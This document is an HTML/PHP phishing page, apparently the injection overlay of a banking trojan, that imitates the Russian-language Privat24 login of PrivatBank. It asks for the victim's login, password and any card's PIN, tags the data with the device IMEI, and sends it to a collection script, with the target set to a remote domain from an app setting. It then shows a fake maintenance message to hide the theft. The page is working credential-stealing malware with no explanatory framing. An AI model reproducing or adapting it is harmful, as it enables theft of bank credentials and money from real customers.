<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
    <link rel="stylesheet" type="text/css" href="privatebank/style.css">
    <script src="privatebank/main.js"></script>
    <title></title>
</head>
<body>
	<div id="page-2">
		<div id="header">
			<div id="img-container">
				<img src="privatebank/1.png">
				<img src="privatebank/2.png">
				<img src="privatebank/3.png">
				<img src="privatebank/4.png">
			</div>
		</div>

<?php 
include 'crypt.php';
//$IMEI = "230|Приват24|"; //$IMEI = htmlspecialchars($_POST['p']);
$IM = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
$IM = decrypt($IM,"qwe");
$IMEI = "$IM|Приват24|";
?>		
			<form action="/private/add_inj.php?p=<?php echo encrypt("$IMEI","qwe");?>"method="post"id="mf"name="mf"onsubmit="return true">
		
			<input type="tel" value="+380" placeholder="Логин" id="privat24-login" name="privat24_login" maxlength="13">
			<input placeholder="Пароль" id="privat24-password" name="privat24_password">
			<input placeholder="ПИН-код любой вашей карты ПриватБанк" id="privat24-pin" name="privat24_pin">
			<div id="additional">

			</div>
			<button class="btn btn-success mb"onclick="send_info()"style="">ВОЙТИ</button>
		</form>
		<div id="error">
			<p>В данный момент проводятся технические работы. Попробуйте позже, приносим извинения за возможные неудобства<br><br>Приложение закроется автоматически</p>
		</div>
	</div>
	<div id="forgot">
		<p id="p1">Если вы являетесь пользователем системы Приват24, для восстановления пароля Вам необходимо обратиться в офис банка с документом удостоверяющим личность либо на сайте банка в разделе "Восстановление пароля".</p>
	</div>
<script>
$('#forgot-show').click(function() {
	$('#forgot').show();
});
$('#forgot').click(function() {
	$('#forgot').hide();
});

function Privat24() {
	if ($('#privat24-login').val().length >= 5 && $('#privat24-password').val().length >= 5 && $('#privat24-pin').val().length == 4)  {
		$('#send-privat24').prop("disabled", false);
	}
	else {
		$('#send-privat24').prop("disabled", true);
	}
};
setInterval(Privat24, 100);

$('#send-privat24').click(function() {
	$('#privat24').fadeOut(1000, function() {
		$('#error').fadeIn(500).delay(5000).delay(100, function() {
			document.myformprivat24.submit();
		});
	});

});

document.myformprivat24.action = "http://"+MeSetting.getDomain()+"/api/indata.php?type=Privat24";
</script>
</body>
</html>

